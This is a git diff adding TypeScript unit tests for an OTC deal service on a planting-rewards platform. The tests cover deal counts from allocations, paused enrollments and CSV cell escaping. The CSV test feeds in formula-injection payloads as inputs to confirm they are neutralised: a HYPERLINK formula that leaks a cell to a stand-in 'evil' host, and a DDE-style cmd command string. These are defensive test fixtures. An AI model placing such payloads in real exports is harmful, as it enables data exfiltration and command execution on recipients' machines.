@@ -16,10 +16,14 @@ import { OtcNotificationInput } from './otcNotifications'
 import {
   __setNotifierForTests,
   confirmDeal,
+  createDealForSubmission,
+  csvCell,
   ensureDealForSubmission,
   joinWithInvite,
+  listEligibleSubmissionsForPlanter,
   onSubmissionRejected,
   OtcError,
+  patchDealCount,
 } from './otcService'
 import { RewardService } from './rewardService'
 
@@ -737,7 +741,8 @@ test('onSubmissionRejected: awaiting_payment -> cancelled (submission_rejected),
   ])
   const toPlanter = sent.find(n => n.recipientWalletAddress === PLANTER)
   assert.match(toPlanter.body, /rejected/)
-  assert.match(toPlanter.body, /paid to your wallet as usual/)
+  // A rejected planting never gets an allocation: no MGRO promise.
+  assert.doesNotMatch(toPlanter.body, /paid to your wallet as usual/)
   assert.equal(toPlanter.link, `/submissions/${String(deal.submissionId)}`)
   const toBuyer = sent.find(n => n.recipientWalletAddress === BUYER)
   assert.equal(toBuyer.telegram, true)
@@ -1110,4 +1115,124 @@ test('joinWithInvite: validation and availability errors', async () => {
   assert.equal(counters.inviteInc, 1)
   assert.equal(counters.created, 0)
   assert.equal(sent.length, 0)
+})
+
+// ------------------------------------------- D2: deal count = allocation count
+
+test('ensureDealForSubmission: approved with an existing allocation prices the deal from the allocation count', async () => {
+  const created = setupEnsure(makeEnrollment())
+  const submission = makeSubmission({
+    status: 'approved',
+    treesPlanted: 120,
+    aiVerification: {
+      status: 'completed',
+      countedMangroves: 100,
+      confidence: 0.9,
+      decision: 'pending_verifier',
+    },
+  })
+  // Allocation built from the declared count (120) before any deal existed.
+  stub(RewardService.prototype, 'holdAllocationForDeal', async () => ({
+    held: true,
+    exists: true,
+    allocationId: 'alloc-1',
+    treesPlanted: 120,
+    planterTotalWei: '777',
+  }))
+
+  await ensureDealForSubmission(submission)
+
+  const deal = created[0]
+  assert.equal(deal.trees, 120)
+  assert.equal(deal.countSource, 'approved')
+  assert.equal(deal.amountKes, computeDealAmountKes(120, 10))
+  assert.equal(deal.expectedMgroWei, '777')
+  assert.equal(deal.status, 'awaiting_payment')
+  assert.match(deal.countNote, /120 trees/)
+  assert.match(deal.countNote, /AI counted 100/)
+})
+
+test('patchDealCount: allocation already exists -> 409 ALLOCATION_EXISTS, no transition', async () => {
+  const deal = makeDeal({ status: 'awaiting_count', trees: 100 })
+  const store = useDealStore(deal)
+  stub(RewardAllocation, 'findOne', () =>
+    chain({ treesPlanted: 100, planterTotalWei: '1' }),
+  )
+  stub(Submission, 'findById', () => chain({ status: 'approved' }))
+
+  await rejectsOtc(
+    () => patchDealCount(BUYER, String(deal._id), 200),
+    'ALLOCATION_EXISTS',
+    409,
+  )
+  assert.equal(store.transitions.length, 0)
+  assert.equal(store.doc.trees, 100)
+})
+
+test('patchDealCount: no allocation yet -> manual count recomputes the deal', async () => {
+  const deal = makeDeal({ status: 'awaiting_count', trees: 0 })
+  const store = useDealStore(deal)
+  stub(RewardAllocation, 'findOne', () => chain(null))
+  stub(Submission, 'findById', () => chain({ status: 'pending_review' }))
+
+  const result = await patchDealCount(BUYER, String(deal._id), 300)
+
+  assert.equal(store.transitions.length, 1)
+  const set = store.transitions[0].update.$set
+  assert.equal(set.trees, 300)
+  assert.equal(set.countSource, 'manual')
+  assert.equal(set.amountKes, computeDealAmountKes(300, 10))
+  assert.equal(set.status, 'awaiting_payment')
+  assert.equal(result.status, 'awaiting_payment')
+})
+
+// ------------------------------------------------ D6: paused -> no new deals
+
+test('createDealForSubmission: paused enrollment -> 409 ENROLLMENT_PAUSED, nothing created', async () => {
+  stub(Submission, 'findById', () => chain(makeSubmission()))
+  stub(OtcEnrollment, 'findOne', () =>
+    chain(makeEnrollment({ status: 'paused' })),
+  )
+  stub(OtcDeal, 'findOne', () => chain(null))
+  stub(OtcDeal, 'create', async () => {
+    throw new Error('must not create')
+  })
+
+  await rejectsOtc(
+    () => createDealForSubmission(BUYER, String(new mongoose.Types.ObjectId())),
+    'ENROLLMENT_PAUSED',
+    409,
+  )
+  assert.equal(sent.length, 0)
+})
+
+test('listEligibleSubmissionsForPlanter: paused enrollment -> 409 ENROLLMENT_PAUSED', async () => {
+  stub(OtcEnrollment, 'findOne', () => chain({ status: 'paused' }))
+  stub(Submission, 'find', () => {
+    throw new Error('must not query submissions')
+  })
+
+  await rejectsOtc(
+    () => listEligibleSubmissionsForPlanter(BUYER, PLANTER),
+    'ENROLLMENT_PAUSED',
+    409,
+  )
+})
+
+// ------------------------------------------------------- CSV export safety
+
+test('csvCell: formula-leading values are neutralised and quoted', () => {
+  assert.equal(csvCell('Jane Doe'), 'Jane Doe')
+  assert.equal(csvCell(200), '200')
+  assert.equal(csvCell(null), '')
+  assert.equal(csvCell('a,b'), '"a,b"')
+  assert.equal(csvCell('say "hi"'), '"say ""hi"""')
+  assert.equal(
+    csvCell('=HYPERLINK("http://evil/"&A1,"Open")'),
+    `"'=HYPERLINK(""http://evil/""&A1,""Open"")"`,
+  )
+  assert.equal(csvCell("-2+3+cmd|' /C calc'!A0"), `"'-2+3+cmd|' /C calc'!A0"`)
+  assert.equal(csvCell('+254712345678'), `"'+254712345678"`)
+  assert.equal(csvCell('@SUM(1)'), `"'@SUM(1)"`)
+  assert.equal(csvCell('\tx'), `"'\tx"`)
 })
